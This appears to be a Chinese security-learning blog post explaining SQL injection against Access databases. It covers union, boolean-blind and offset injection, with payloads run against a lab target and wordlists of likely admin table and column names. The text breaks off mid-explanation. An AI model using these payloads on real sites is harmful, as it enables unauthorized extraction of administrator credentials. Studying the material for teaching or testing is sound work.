1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">SQL注入之Access篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-10-08T12:03:04.528Z" title="发表于 2023-10-08 20:03:04">2023-10-08</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-09T13:06:20.615Z" title="更新于 2023-10-09 21:06:20">2023-10-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">6.6k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入之Access篇"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">SQL注入之Access篇</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-10-08T12:03:04.528Z" title="发表于 2023-10-08 20:03:04">2023-10-08</time><time itemprop="dateCreated datePublished" datetime="2023-10-09T13:06:20.615Z" title="更新于 2023-10-09 21:06:20">2023-10-09</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>之前只是学习了最基础的MySQL数据库注入，然后看了小迪的课认为还是很有必要赶紧拓展的，于是我就写此文章学习一下一些其他数据库的特性：如常规注入语句、数据库本身的特性、与MySQL数据库的区别。话不多说，直接开卷！</p>
<h1 id="0x02-概括">0x02 概括</h1>
<p>​		SQL注入是非常常见的一个漏洞，如果程序员在编写网站源码时未对SQL执行语句作防护措施，那么用户输入就可以执行SQL语句，导致用户数据被删改、拖库、挂马等。而它的种类也根据参数类型、提交方式、注入方式以及数据库类型的不同来进行区分。</p>
<p>​		Access数据库是一种小型数据库用于储存数据，其中各个对象之间可以建立关联，方便用户快速查询与调用数据。它相对其他数据库来说比较简单，只有一个数据库，里面存放着表、列以及数据，通过简单的语句就可以完成注入。一般通过<strong>联合注入、逐字猜解、偏移注入</strong>等方式进行攻击，在面对搭载这类数据库的网站时，也可以针对.mdb和.asp后缀名的文件进行爆破，说不定存在信息泄露可以直接拿到数据库。本文主要针对Access数据库的注入的原理以及攻击方式进行归纳。</p>
<p>这里搞一个常见数据库组合小tip：</p>
<pre><code class="hljs plaintext">asp/: sql server, Access
.net : sql server
php: PostgreSQL, Mysql
java: Oracle, Mysql</code></pre>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/riyir/p/12623272.html">SQL注入判断数据库类型</a></p>
<h1 id="0x03-注入思路">0x03 注入思路</h1>
<p>1、通过报错或常见组合判断数据库类型（MySQL+PHP、MSSQL+ASPX、Oracle+JSP…）</p>
<p>2、截取请求包更换请求方式（POST、GET…）或更改请求包参数（Cookie、Referer、User-Agent…）寻找注入点</p>
<p>3、通过单引号、百分号来判断注入参数类型（数字型、字符型、搜索型…）</p>
<p>4、选择攻击注入方式（联合注入、逐字猜解、偏移注入…）</p>
<p>5、判断是否能猜解到表名、列名，主要分为以下三种情况：</p>
<pre><code class="hljs plaintext">- 如果能猜解到表名和列名，那么可以使用联合注入或逐字猜解
- 如果只能猜解到表名，无法猜解到列名，那么可以使用偏移注入
- 如果无法猜解到表名或列名，那么可以查看网站源代码、提交的参数来构造表名（还不行的话就赶紧溜吧，无从下手的）</code></pre>
<p>6、获取数据库中的敏感数据登录后台或直接写入webshell</p>
<p>下面先讲理论，之后实战操作一下。</p>
<h1 id="0x04-注入方式">0x04 注入方式</h1>
<p>判断是否存在注入点：</p>
<pre><code class="hljs plaintext">粗略型：提交单引号'
逻辑型（数字型注入）：and 1=1  或  and 1=2
逻辑型（字符型注入）：' and '1'='1  或 'and '1'='2
逻辑型（搜索型注入）：%' and 1=1 and '%'='%  或  %' and 1=2 and '%'='%</code></pre>
<h2 id="41-联合注入">4.1 联合注入</h2>
<p>1、判断注入点，一般来说单引号、减号、and等就可以判断是否存在注入</p>
<pre><code class="hljs plaintext">?id=3'  #返回页面与id=3不同，说明存在注入
?id=3-1 #返回一个与id=3不同的正常界面，说明已经代入数据库执行，存在注入
?id=3 and 1=2 #返回页面与and 1=1不同，说明已经完成了真假判断，存在注入</code></pre>
<p>2、通过order by 判断字段数，将字段数从小到大以此类推，直至返回错误页面，而正确的字段数就是返回错误的字段数减一</p>
<pre><code class="hljs plaintext">?id=3 order by 1
...
?id=3 order by 10 #返回错误页面，字段数为9</code></pre>
<p>3、通过联合查询</p>
<pre><code class="hljs plaintext">select * from article where id= -1 union select 1,[column_name],3 from [table_name]

如：-1 union select 1,username,password,4,5,6,7,8,9,10 from admin</code></pre>
<p>那么在实际场景中，只需要先找到注入点，通过order by进行字段判断，再使用可控输入对目标数据库进行联合注入即可，本质上和</p>
<p>MySQL的联合注入差不多，不过它没有information_schema库，需要猜解它的表名和列名，如果猜对了就会在网页上回显账号密码。可</p>
<p>以将以下常用的表名和列名进行猜解。</p>
<p>常见的表名：</p>
<pre><code class="hljs plaintext">admin,a_admin,x_admin,m_admin,adminuser,admin_user,article_admin,administrator,manage,manager,member,memberlist,user,users,Manage_User,user_info,admin_userinfo,UserGroups,user_list,login,用户,Friend,zl,movie,news,password,clubconfig,config,company,book,art,dv_admin,userinfo</code></pre>
<p>常见的列名：</p>
<pre><code class="hljs plaintext">username,adminusername,admin_username,adminname,admin_name,admin,adminuser,admin_user,usrname,usr_name,user_admin,password,admin_password,administrator,administrators,adminpassword,adminpwd,admin_pwd,adminpass,admin_pass,usrpass,usr_pass,user,name,pass,userpass,user_pass,userpassword,user_password,pwd,userpwd,user_pwd,useradmin,pword,p_word,pass-wd,yonghu,用户,用户名,密码,帐号,id,uid,userid,user_id,adminid,admin_id,login_name</code></pre>
<h2 id="42-逐字猜解">4.2 逐字猜解</h2>
<p>access数据库函数查询可参考：<a target="_blank" rel="noopener" href="https://cankaoshouce.com/access-function/access-mid.html">MS Access 常用函数</a></p>
<p>逐字猜解其实到最后用的就是布尔盲注，根据目标的返回页面差异来判断注入是否成功，比较依赖运气，需要依赖强大的字典，一般采用的SQL语句如下</p>
<pre><code class="hljs plaintext">select * from admin where id= *
如：834 and (select top 1 asc(mid(admin_name,2,1)) from admin)=104
//这里的asc是返回字符的ascii码值。
//mid函数为从指定字符串中提取一些字符</code></pre>
<p><strong>1、判断表名</strong></p>
<p>实际上就是对表名进行猜解，再根据表名做进一步操作</p>
<pre><code class="hljs plaintext">?id=843 and exists(select * from [table_name])

?id=843 and exists(select * from admin1) #返回错误界面

?id=843 and exists(select * from admin)  #返回正常界面</code></pre>
<p><strong>2、猜解列名</strong></p>
<pre><code class="hljs plaintext">?id=843 and exists(select [column_name] from admin) 

?id=843 and exists(select admin_id from admin)   #页面正常，列名正确

?id=843 and exists(select admin_name from admin) #页面正常，列名正确

?id=843 and exists(select admin_pass from admin) #页面报错，列名错误，未猜出密码列名</code></pre>
<p>猜解出了目标id和用户名的列名分别是admin_id和admin_name，但未猜解出密码列名</p>
<p><strong>3、通过布尔盲注获取数据</strong></p>
<p>判断字段长度</p>
<pre><code class="hljs plaintext">?id=834 and (select top 1 len(admin_name) from admin) &gt; [length]

?id=834 and (select top 1 len(admin_name) from admin) &gt; 8 #页面报错，长度小于或等于8

?id=834 and (select top 1 len(admin_name) from admin) = 7 #页面正常，长度等于7</code></pre>
<p>判断数据，这里可以使用burp或直接写脚本跑即可</p>
<pre><code class="hljs plaintext">?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin) &lt; [length] 

?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin)&lt;113 #页面报错，admin_name列第一个数据ascii码大于等于113

?id=834 and (select top 1 asc(mid(admin_name,1,1)) from admin)=113 #页面正确，说明第一个数据ascii码为113，查询ascii表为r

?id=834 and (select top 1 asc(mid(admin_name,2,1)) from admin)=104 #页面正确，说明第二个数据ascii码为104，查询ascii表为h</code></pre>
<p>最后拿到用户名</p>
<h2 id="43-偏移注入">4.3 偏移注入</h2>
<p>​		偏移注入的前提是需要猜出表名且知道一个或多个字段，这个前提可以使用之前的方法获得。它的优势和劣势一样突出，优势是无需用户名和密码的字段就可以直接爆出账号密码，劣势是也需要运气，不能保证绝对成功。</p>
<p>​		<strong>主要原理是拿到order by判断出的字段数x以及回显正常的<code>*</code>，然后再用order by的字段数x减去2倍的<code>*</code>值即是所需字段数。例如字段数为22，回显正常的<code>*</code>值为6，所需的字段数就是22-2x6=10，根据该值进行构造即可完成偏移注入。</strong></p>
<p>这里我感觉他解释的不清楚，于是找了几篇文章继续学习：</p>
<ul>
<li>
<p>偏移注入的原理</p>
<p>（这里只是粗略的概述，详细请看下面）：</p>
<ul>
<li>就是将目标表进行(多级)内连接，通过联合查询和已知目标字段名的微调，将我们想要知道的字段值在已经确定的显示位上暴露出来。</li>
</ul>
</li>
<li>
<p>影响偏移注入成功率的因素（当然这些因素都是影响因素，不是决定因素）：</p>
<ol>
<li>联合查询中显示位的位置</li>
<li>当前注入点所查询的字段数量</li>
<li>目标表的字段数量</li>
<li>我们可以猜解到的目标表的字段名的数量</li>
</ol>
</li>
</ul>
<p>这里先借助那篇文章的图片了┭┮﹏┭┮</p>
<p>此次实战测试主要涉及的两张表：product表和admin表</p>
<ul>
<li>product表：该表有22个字段</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231008210351193.png" alt="image-20231008210351193"></p>
<p>admin表：该表有6个字段（<strong>请谨记这个字段数</strong>）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231008210401269.png" alt="image-20231008210401269"></p>
<pre><code class="hljs plaintext">1.exist()函数：用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False。
2.as关键字：用于起别名，可以为表起别名，也可以为字段起别名（as关键字可省略）
3.表1 inner join 表2 on 筛选条件 ：该关键字用于将表1与表2做笛卡尔积，然后根据on后面的条件进行筛选。
4.top n 关键字：作用是使查询结果只显示前n条记录</code></pre>
<p>下图中select语句的意思是：将admin表与自己做笛卡尔积，然后筛选出两者id值相同的记录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231008212130067.png" alt="image-20231008212130067"></p>
<p>下图意思为：查询 admin 表的前六个数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231008212237674.png" alt="image-20231008212237674"></p>
<h3 id="431-注入原理">4.3.1 注入原理</h3>
<ul>
<li>
<p>为了方便讲解，这里选择 “实战” 和 “偏移注入的注入原理” 相结合的方式进行讨论。</p>
</li>
<li>
<p>偏移注入的流程是：</p>
<ol>
<li>
<p>判断是否存在注入点</p>
</li>
<li>
<p>判断当前注入点所查询的字段数量</p>
<p>（请一定谨记以下的简略表述，后面的文章均采用以下简略表述）</p>
<ul>
<li><strong>使用sql语句帮助理解：<code>select 当前字段数量 from 当前表 union select ... from 目标表</code></strong></li>
<li><strong>在这里【当前表】-&gt;product表；【目标表】-&gt;admin表</strong></li>
</ul>
</li>
<li>
<p>猜解目标表的表名</p>
</li>
<li>
<p>确定显示位</p>
</li>
<li>
<p>确定目标表的字段数量</p>
</li>
<li>
<p>开始进行偏移注入，经过不断的“微调”，将我们想要的字段值在显示位处暴露出来。</p>
</li>
</ol>
</li>
</ul>
<h3 id="432-判断是否存在注入点">4.3.2 判断是否存在注入点</h3>
<pre><code class="hljs plaintext">?id=1513 and 1=1 页面回显正常
?id=1513 and 1=2 页面回显错误</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009194823833.png" alt="image-20231009194823833"></p>
<p>这里不知为何我的1=2之后页面什么也没有，只能右键源代码看到页面是报错的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009194859913.png" alt="image-20231009194859913"></p>
<p>这里说明存在注入点，且为数字型注入</p>
<h3 id="433-判断当前字段数量">4.3.3  判断当前字段数量</h3>
<pre><code class="hljs plaintext">?id=1513 order by 22 页面显示正常
?id=1513 order by 23 页面显示错误</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009195027899.png" alt="image-20231009195027899"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009195041923.png" alt="image-20231009195041923"></p>
<p>说明当前表名下的字段数为22</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009195313028.png" alt="image-20231009195313028"></p>
<h3 id="434-猜测当前表的表名">4.3.4 猜测当前表的表名</h3>
<p>这里我看文章用的是exists方式，其实常规的话应该是如下payload</p>
<pre><code class="hljs plaintext">UNION select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</code></pre>
<p>也就是联合注入方式。这里找到一篇文章说：</p>
<pre><code class="hljs plaintext">联合查询法：速度快，兼容性不好
逐字猜解发：速度慢，兼容性好--也就是上述的exists方法</code></pre>
<p>这里呢我在最后再放出两种方法的注入语句的总结吧。</p>
<pre><code class="hljs plaintext">?id=1513 and exists(select * from admin)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009195908264.png" alt="image-20231009195908264"></p>
<p>​		因为access数据库没有类似于mysql的information_schema这样的系统索引库，所以我们只能根据经验靠猜了，在真实的测试环境中，我们也可以通过社工的方式进行猜解。</p>
<p>此次页面返回正常，说明存在access数据库中存在admin表。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009200012512.png" alt="image-20231009200012512"></p>
<p>我们也可以进一步验证一下，改一下参数看看页面的变化</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009200041526.png" alt="image-20231009200041526"></p>
<p>可以看到报错了，说明不存在该表</p>
<h3 id="435-确定回显位">4.3.5 确定回显位</h3>
<pre><code class="hljs plaintext">?id=1513 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</code></pre>
<p>这里前面依旧添加1=2是为了让1513 and 1=2这个整体报错，以防占用回显位。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009200310966.png" alt="image-20231009200310966"></p>
<p>如上图所示发现回显位为3、9、13、15</p>
<p>至于为何这里非要在后面加入from admin我也产生了疑问，因为我记得mysql数据库是不需要的，于是我去掉这俩单词后发现如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009200643861.png" alt="image-20231009200643861"></p>
<p>如图，这代表我们在查询回显位还必须带一个正确的表。。。。</p>
<h3 id="436-确定目标表的字段数量">4.3.6 确定目标表的字段数量</h3>
<p>这里是确定admin表的字段数量（注意这里还要在确定的原因我想是，我们进入该页面查询的时候，当前表并非admin表）</p>
<p>这里呢我们根据当前页面路径去源码查找验证一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009201017026.png" alt="image-20231009201017026"></p>
<p>如上图，果然这里查询的表为product表</p>
<pre><code class="hljs plaintext">?id=1513 and exists(select * from admin order by 6) 页面回显正常
?id=1513 and exists(select * from admin order by 7) 页面回显错误</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009201157489.png" alt="image-20231009201157489"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009201213116.png" alt="image-20231009201213116"></p>
<p>说明admin表的字段数为6个，我们查看数据库验证一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009201243621.png" alt="image-20231009201243621"></p>
<p>如上图很明显是正确的！</p>
<h3 id="437-进行偏移注入">4.3.7 进行偏移注入</h3>
<ul>
<li>
<p><strong>偏移注入的基本公式</strong>：</p>
<ul>
<li>
<p><strong><code>联合查询所要补充的字段数 = 当前字段数量 - 目标表的字段数 x N（N=1,2...）</code></strong>【注意：“联合查询所要补充的字段数” 指的是union关键字后面的select查询所需补充的字段数】</p>
</li>
<li>
<p>在此处即为：联合查询补充字段数 = 当前字段数量（22） - admin表的字段数（6） x N</p>
</li>
<li>
<p>当N=1时我们称为 “1级偏移注入”，当N=2时我们称为 “2级偏移注入”；当N=3时我们称为 “3级偏移注入”，…</p>
<p><strong>1级偏移注入的payload</strong>：</p>
</li>
<li>
<p>根据公式我们可以计算出：联合查询补充字段数 = 22-6x1 = 16</p>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16, * from admin</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009201704875.png" alt="image-20231009201704875"></p>
<p>在这里我们解释一下，为什么1级偏移注入并没有爆出我们想要的字段值呢：</p>
<ul>
<li>由前面的步骤我们已经得知，已经确定的显示位只有 3,9,13,15 四个，即只有处于第3,9,13,15这四个字段的数据才可以显示出来，</li>
<li>但是我们观察下标发现，在进行1级偏移注入时，admin表的数据实际上是排在了17号字段之后了，当然不会在页面中显示出来。</li>
<li>那么我们怎么样才可以将admin表的数据向前移动，以致可以使其处于第3,9,13,15号字段而显示出来呢？</li>
<li>答案是：我们可以进行2级(多级)偏移注入（即通过admin表的自连接使得sql语句中“ * ”所代表的的字段数增大，那么联合查询中用于充数字段就会减小，这样的话，admin表中的数据自然会向前移动了）</li>
</ul>
<p>这里附上参考文章的图片，解释的比较清晰</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009203807936.png" alt="image-20231009203807936"></p>
<p><strong>2级偏移注入的payload</strong>：</p>
<ul>
<li>根据公式我们可以计算出：联合查询补充字段数 = 22-6x2 = 10</li>
</ul>
<pre><code class="hljs plaintext">?id=1513 union select 1,2,3,4,5,6,7,8,9,10, * from (admin a inner join admin b on a.id=b.id)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009202101692.png" alt="image-20231009202101692"></p>
<p>这里我们输入payload之后查看源代码发现13回显位爆出了加密的密码</p>
<ul>
<li>但这是为什么呢？
<ul>
<li>通过分析下图我们发现，经过2级偏移注入，我们成功的将admin表的数据向前移动了6个字段，使其原本在17号字段及其之后才显现出的数据，变为了在11号字段及其之后就可回显而出。而此时admin表的password字段和count_time字段恰好处于显示位13和15上，于是就自然而然的暴露了出来。</li>
</ul>
</li>
<li>那又为什么admin表的数据会向前移动6个字段呢？
<ul>
